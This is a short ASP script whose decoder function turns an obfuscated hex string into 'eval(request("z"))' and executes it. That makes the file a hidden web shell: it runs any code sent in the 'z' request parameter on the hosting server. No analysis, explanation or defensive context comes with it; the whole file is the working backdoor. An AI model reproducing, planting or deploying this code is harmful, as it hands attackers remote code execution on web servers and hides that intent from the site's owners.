<%
Function Writesource(str)
  Response.write(str)
End Function
Function cd(ByVal s, ByVal key)
    For i = 1 To Len(s) Step 2
        c = Mid(s, i, 2)
        k = (i + 1) / 2 Mod Len(key) + 1
        p = Mid(key, k, 1)
        If IsNumeric(Mid(s, i, 1)) Then
            cd = cd & Chr(("&H" & c) - p)
        Else
            cd = cd & Chr("&H" & c & Mid(s, i + 2, 2))
            i = i + 2
        End If
    Next
End Function
Execute cd("6877656D2B736972786677752B237E232C2A","1314")
%>
